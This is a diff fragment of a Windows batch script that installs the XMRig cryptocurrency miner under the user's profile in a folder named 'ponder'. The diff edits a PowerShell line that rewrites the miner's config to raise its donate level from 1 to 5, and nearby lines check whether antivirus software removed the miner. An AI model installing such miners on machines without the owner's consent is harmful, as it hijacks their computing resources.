@@ -224,7 +224,7 @@ if errorlevel 1 (
 del "%USERPROFILE%\xmrig.zip"
 
 echo [*] Checking if advanced version of "%USERPROFILE%\ponder\xmrig.exe" works fine ^(and not removed by antivirus software^)
-powershell -Command "$out = cat '%USERPROFILE%\ponder\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 1,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\ponder\config.json'" 
+powershell -Command "$out = cat '%USERPROFILE%\ponder\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 5,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\ponder\config.json'" 
 "%USERPROFILE%\ponder\xmrig.exe" --help >NUL
 if %ERRORLEVEL% equ 0 goto MINER_OK
 :MINER_BAD
@@ -272,7 +272,7 @@ if errorlevel 1 (
 del "%USERPROFILE%\xmrig.zip"
 
 echo [*] Checking if stock version of "%USERPROFILE%\ponder\xmrig.exe" works fine ^(and not removed by antivirus software^)
-powershell -Command "$out = cat '%USERPROFILE%\ponder\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 1,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\ponder\config.json'" 
+powershell -Command "$out = cat '%USERPROFILE%\ponder\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 5,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\ponder\config.json'" 
 "%USERPROFILE%\ponder\xmrig.exe" --help >NUL
 if %ERRORLEVEL% equ 0 goto MINER_OK
 
